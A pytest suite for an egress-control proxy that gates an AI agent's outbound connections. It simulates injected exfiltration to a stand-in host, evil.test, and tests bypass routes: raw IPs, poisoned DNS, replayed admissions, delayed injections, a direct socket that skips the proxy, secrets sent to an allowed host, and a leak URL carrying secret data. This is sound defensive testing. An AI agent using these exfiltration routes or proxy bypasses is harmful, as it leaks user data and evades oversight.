"""The egress bypass battery — acceptance gate for the first OS-interposition rail.

Egress twin of the DB broker-bypass battery. Frozen mandate allows egress to
{api.allowed.test:443}; an injection wants evil.test:443 (exfil/C2). Each case is
contained-or-fail-loud. Offline + deterministic: real localhost upstreams + real byte-splicing,
a trusted stub resolver, a fixed clock, a tmp SIGNET_HOME for signed receipts. No real network.

Keystones:
  * #8 (P8 advisory-without-netns) asserts a DIRECT connection BYPASSES the proxy and SUCCEEDS —
    the egress only-door is not free; without the netns the proxy is advisory. If it ever flips
    to "blocked" without a real netns, a silent gate is hiding and must be explained.
  * #6 (clock-independent replay) proves the chain_adapter did not reintroduce wall-clock into
    chain_hash (the broker-slice regression).
  * #9b (no-inspection) proves the CONNECT tunnel splices arbitrary bytes untouched.
"""
from __future__ import annotations

import datetime as _dt
import socket

import pytest

from signet.broker.mandate import MandateProvider
from signet.broker.proxy import EgressBroker, EgressProxy
from signet.cli.local_receipts import LocalReceiptLog
from signet.rails.egress.chain_adapter import EgressBrokerCore
from signet.rails.egress.dest_sim import EchoServer, StubResolver
from signet.rails.egress.effect import EgressEffect
from signet.rails.egress.mandate import (EgressGrant, EgressMandate,
                                         EgressStandingPolicy)
from signet.rails.egress.resolver import Resolution
from signet import chain as kernel_chain

T0 = _dt.datetime(2026, 6, 11, 12, 0, 0, tzinfo=_dt.timezone.utc)


class Clock:
    def __init__(self, now): self.now = now
    def __call__(self): return self.now
    def advance(self, s): self.now = self.now + _dt.timedelta(seconds=s)


@pytest.fixture
def env(tmp_path, monkeypatch):
    monkeypatch.setenv("SIGNET_HOME", str(tmp_path / "h"))
    clock = Clock(T0)
    allowed = EchoServer("ALLOWED").start()                       # verbatim echo
    evil = EchoServer("EVIL", transform=lambda b: b"EVIL:" + b).start()
    resolver = StubResolver({
        "api.allowed.test": Resolution("127.0.0.1", allowed.port),
        "evil.test": Resolution("127.0.0.1", evil.port),
    })
    mandates = MandateProvider()
    mandates.register(EgressMandate("task-001", (EgressGrant("api.allowed.test", (443,)),)))
    # The standing ceiling is deliberately BROAD (the org allows a lot); the per-task mandate is
    # the operative narrowing — so out-of-mandate destinations report out-of-mandate-destination,
    # not out-of-standing-policy. (Mirrors the DB rail's standing = staging.* + prod select.)
    standing = EgressStandingPolicy((
        EgressGrant("api.allowed.test", (80, 443, 22)),
        EgressGrant("*.allowed.test", (443,)),
        EgressGrant("evil.test", (443,)),
    ))
    receipts = LocalReceiptLog("broker:egress")
    broker = EgressBroker.create(mandates=mandates, standing=standing, receipts=receipts,
                                 task_id="task-001", resolver=resolver, clock=clock,
                                 ttl_seconds=60)
    proxy = EgressProxy(broker).start()
    yield dict(broker=broker, proxy=proxy, allowed=allowed, evil=evil, receipts=receipts,
               resolver=resolver, clock=clock, mandates=mandates, standing=standing)
    proxy.stop(); allowed.stop(); evil.stop()


def _recv_n(sock, n, timeout=2.0):
    sock.settimeout(timeout)
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            break
        buf += chunk
    return buf


def _connect_tunnel(proxy, host, port):
    """Open a CONNECT tunnel; return (socket, established: bool, raw_reply)."""
    s = socket.create_connection((proxy.host, proxy.port), timeout=3)
    s.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
    reply = s.recv(1024)
    return s, (b"200" in reply), reply


# ===========================================================================================
# 1. HONEST — CONNECT to an allowed destination tunnels and round-trips bytes
# ===========================================================================================
def test_01_honest_connect_tunnels_and_round_trips(env):
    s, ok, reply = _connect_tunnel(env["proxy"], "api.allowed.test", 443)
    assert ok, reply
    s.sendall(b"ping")
    assert _recv_n(s, 4) == b"ping"        # verbatim echo from the ALLOWED upstream
    s.close()
    assert any(r["verdict"] == "pass" and r["effect"]["channel"] == "proxy"
               for r in env["receipts"].records())


# ===========================================================================================
# 2. OUT-OF-MANDATE-DESTINATION — evil.test is in the standing ceiling but not the task mandate
# ===========================================================================================
def test_02_out_of_mandate_destination_refused(env):
    adm = env["broker"].admit("evil.test", 443)
    assert not adm.admitted and adm.cause == "out-of-mandate-destination"
    rec = next(r for r in env["receipts"].records() if r["id"] == adm.receipt_id)
    assert rec["verdict"] == "deny" and rec["effect"]["channel"] == "injection"


# ===========================================================================================
# 3. RAW-IP EVASION — a raw IP with no allowlisted host is refused
# ===========================================================================================
def test_03_raw_ip_to_attacker_refused(env):
    # the agent dials evil's actual localhost ip:port as a raw IP literal, dodging the hostname
    adm = env["broker"].admit("127.0.0.1", env["evil"].port)
    assert not adm.admitted and adm.cause == "out-of-mandate-destination"


# ===========================================================================================
# 4. POISONED-RESOLVER — the proxy resolves via its TRUSTED resolver, ignoring agent-side DNS
# ===========================================================================================
def test_04_trusted_resolution_defeats_poisoned_resolver(env):
    # The proxy resolves with ITS trusted resolver; a poisoned agent-side map is irrelevant.
    # The trusted resolver maps the allowed name to the ALLOWED upstream, never to evil:
    res = env["resolver"].resolve("api.allowed.test")
    assert (res.ip, res.port) == ("127.0.0.1", env["allowed"].port) != env["evil"].port
    # End to end through the proxy: bytes come back from ALLOWED (verbatim), never EVIL (prefixed)
    # — had the proxy honored a poisoned api.allowed.test->evil mapping we'd see b"EVIL:x".
    s, ok, reply = _connect_tunnel(env["proxy"], "api.allowed.test", 443)
    assert ok, reply
    s.sendall(b"x")
    assert _recv_n(s, 1) == b"x"
    s.close()


# ===========================================================================================
# 5. FORBIDDEN PORT — an allowed host on a non-permitted port is refused
# ===========================================================================================
def test_05_forbidden_port_on_allowed_host_refused(env):
    adm = env["broker"].admit("api.allowed.test", 22)
    assert not adm.admitted and adm.cause == "out-of-mandate-destination"


# ===========================================================================================
# 6. CONSUME-ONCE + CLOCK-INDEPENDENT REPLAY (acceptance #4)
# ===========================================================================================
def test_06_replay_refused_and_chain_hash_is_clock_independent(env):
    # within the window, replaying the identical admission is refused
    first = env["broker"].admit("api.allowed.test", 443)
    assert first.admitted
    again = env["broker"].admit("api.allowed.test", 443)
    assert not again.admitted and again.cause == "replay"

    # the chain_hash itself does not depend on wall-clock: same effect, two different clocks ->
    # identical chain_hash (the broker-slice regression would have produced two different hashes)
    eff = EgressEffect("api.allowed.test", 443, "http_connect")
    core_a = EgressBrokerCore.create(clock=lambda: T0)
    core_b = EgressBrokerCore.create(clock=lambda: T0 + _dt.timedelta(days=99))
    # same principal key needed for an identical chain; compare the destination-bound sub-hash
    ra = core_a.build_request(eff, "task-001", "agent")
    rb = core_b.build_request(eff, "task-001", "agent")
    assert kernel_chain.cart_hash(ra.cart) == kernel_chain.cart_hash(rb.cart), \
        "cart (host+port+protocol) hash must be clock-independent"

    # and a long-TTL broker: advance the clock far, replay -> STILL refused (window open, hash
    # unchanged), proving refusal is not an artifact of the clock
    clock = Clock(T0)
    broker = EgressBroker.create(mandates=env["mandates"], standing=env["standing"],
                                 receipts=LocalReceiptLog("broker:egress:ttl"),
                                 task_id="task-001", resolver=env["resolver"], clock=clock,
                                 ttl_seconds=100000)
    assert broker.admit("api.allowed.test", 443).admitted
    clock.advance(3600)
    replay = broker.admit("api.allowed.test", 443)
    assert not replay.admitted and replay.cause == "replay"


# ===========================================================================================
# 7. PERSISTENCE / DWELL — an injection planted on turn 1 fires on turn N, still contained
# ===========================================================================================
def test_07_delayed_injection_is_contained(env):
    broker, clock = env["broker"], env["clock"]
    assert broker.admit("api.allowed.test", 443).admitted     # turn 1, legit
    planted = ("evil.test", 443)                              # captured, not yet fired

    clock.advance(30)                                        # within ttl: replay refused
    assert broker.admit("api.allowed.test", 443).cause == "replay"

    clock.advance(3600)                                      # ... turn N ...
    fired = broker.admit(*planted)                           # the per-task mandate still holds
    assert not fired.admitted and fired.cause == "out-of-mandate-destination"


# ===========================================================================================
# 8. NEGATIVE / P8 — a DIRECT connection bypasses the proxy and SUCCEEDS (advisory w/o netns)
# ===========================================================================================
def test_08_NEGATIVE_direct_connection_bypasses_proxy(env):
    # No netns in v0: the agent simply does NOT use the proxy and connects straight to evil.
    s = socket.create_connection(("127.0.0.1", env["evil"].port), timeout=2)
    s.sendall(b"exfil")
    out = _recv_n(s, len(b"EVIL:exfil"))
    s.close()
    # The bypass MUST succeed — the honest egress limit, asserted not hidden.
    assert out == b"EVIL:exfil", "P8: without EGRESS-SOLE-PATH the proxy is advisory"


# ===========================================================================================
# 9. HONEST-SCOPE PERIMETER — the declared NON-coverage, asserted as EXPECTED
# ===========================================================================================
def test_09a_exfil_via_allowlisted_host_is_admitted_out_of_perimeter(env):
    # binding is WHERE not WHAT: secrets pushed to an ALLOWED host are not stopped (by design)
    s, ok, _ = _connect_tunnel(env["proxy"], "api.allowed.test", 443)
    assert ok
    s.sendall(b"SECRET-DATA")
    assert _recv_n(s, len(b"SECRET-DATA")) == b"SECRET-DATA"   # admitted; out-of-perimeter
    s.close()


def test_09b_connect_tunnel_splices_arbitrary_bytes_untouched(env):
    # no TLS termination, no parsing: every byte value round-trips verbatim
    s, ok, _ = _connect_tunnel(env["proxy"], "api.allowed.test", 443)
    assert ok
    payload = bytes(range(256)) * 4
    s.sendall(payload)
    assert _recv_n(s, len(payload)) == payload
    s.close()


def test_09c_link_preview_emission_produces_no_egress_event(env):
    # the agent EMITTING a URL (no connection) is architecturally out of process: the proxy
    # never sees it. Documented in executable form.
    before = len(list(env["receipts"].records()))
    _emitted_url = "https://evil.test/leak?data=secret"   # a string; no socket is opened
    after = len(list(env["receipts"].records()))
    assert after == before, "emitting a URL string is not an egress event the proxy can see"


# ===========================================================================================
# Supporting invariants
# ===========================================================================================
def test_plain_http_forward_admits_per_request(env):
    """A keep-alive plain-HTTP connection is gated PER REQUEST: two requests to DIFFERENT hosts
    on the SAME connection are admitted independently. Proven via the receipts (one pass for the
    allowed host, one deny for evil) — robust to the echo upstream not being a real HTTP server."""
    import time

    def _http_verdict(host):
        for r in env["receipts"].records():
            d = r["effect"].get("dest", {})
            if d.get("protocol") == "http" and d.get("host") == host:
                return r["verdict"]
        return None

    def _wait(host, verdict, t=3.0):
        deadline = time.time() + t
        while time.time() < deadline:
            if _http_verdict(host) == verdict:
                return True
            time.sleep(0.05)
        return False

    s = socket.create_connection((env["proxy"].host, env["proxy"].port), timeout=3)
    # request 1 (allowed) — staged so the proxy parses it alone, then blocks reading the next
    s.sendall(b"GET http://api.allowed.test:443/ HTTP/1.1\r\nHost: api.allowed.test\r\n\r\n")
    assert _wait("api.allowed.test", "pass"), "first request (allowed) should be admitted"
    # request 2 (evil) on the SAME keep-alive connection — gated independently
    s.sendall(b"GET http://evil.test:443/ HTTP/1.1\r\nHost: evil.test\r\n\r\n")
    assert _wait("evil.test", "deny"), "second request (evil) should be refused per-request"
    s.close()


def test_monotonic_ceiling_grant_cannot_exceed_standing(env, tmp_path, monkeypatch):
    monkeypatch.setenv("SIGNET_HOME", str(tmp_path / "h2"))
    mandates = MandateProvider()
    mandates.register(EgressMandate("hostile", (EgressGrant("api.allowed.test", (443,)),)))
    standing = EgressStandingPolicy((EgressGrant("api.allowed.test", (80,)),))   # 443 not in ceiling
    broker = EgressBroker.create(mandates=mandates, standing=standing,
                                 receipts=LocalReceiptLog("broker:egress:mono"),
                                 task_id="hostile", resolver=env["resolver"], clock=env["clock"])
    adm = broker.admit("api.allowed.test", 443)
    assert not adm.admitted and adm.cause == "out-of-standing-policy"


def test_bare_wildcard_grant_is_rejected():
    with pytest.raises(ValueError, match="bare '\\*'"):
        EgressGrant("*", (443,))


def test_receipt_chain_verifies(env):
    env["broker"].admit("api.allowed.test", 443)
    env["broker"].admit("evil.test", 443)
    ok, msg, idx = env["receipts"].verify()
    assert ok, msg
    assert idx == -1


def test_egress_authorizer_fills_only_two_hooks():
    """Structural: EgressAuthorizer subclasses the unchanged template and does NOT override
    authorize (the order + fail-closed flow stay in base.Authorizer)."""
    from signet.authorizers.base import Authorizer
    from signet.rails.egress.authorizer import EgressAuthorizer
    assert issubclass(EgressAuthorizer, Authorizer)
    assert EgressAuthorizer.authorize is Authorizer.authorize          # not overridden
    assert "recheck_against_context" in EgressAuthorizer.__dict__
    assert "produce_capability" in EgressAuthorizer.__dict__
